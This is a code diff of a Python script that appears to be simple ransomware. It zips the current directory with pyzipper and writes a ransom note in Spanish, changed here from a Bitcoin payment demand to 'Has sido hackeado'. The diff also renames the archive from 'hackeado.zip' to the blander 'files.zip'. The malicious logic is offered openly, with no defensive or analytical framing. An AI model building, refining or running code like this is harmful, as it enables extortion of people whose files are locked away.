@@ -7,12 +7,12 @@ def getProcessName():
     process_name = process.name()
     return process_name
 
-def zip_folderPyzipper(folder_path, output_path):
+def zip_folderPyzipper(folder_path):
     parent_folder = os.path.dirname(folder_path)
     # Retrieve the paths of the folder contents.
     contents = os.walk(folder_path)
     zip_file=None
-    zip_file_name='hackeado.zip'
+    zip_file_name='files.zip'
     filename=getProcessName()
     # filename=os.path.basename(__file__)
     try:
@@ -65,8 +65,8 @@ def zip_folderPyzipper(folder_path, output_path):
     finally:
         zip_file.close()
 def write_readme():
-    with open('file.txt','w') as file:
-        file.write('Te jakie depositame el bitcoin perro')
+    with open('readme.txt','w') as file:
+        file.write('Has sido hackeado')
 
-zip_folderPyzipper('.','./zip-passwodrd.zip')
+zip_folderPyzipper('.')
 write_readme()
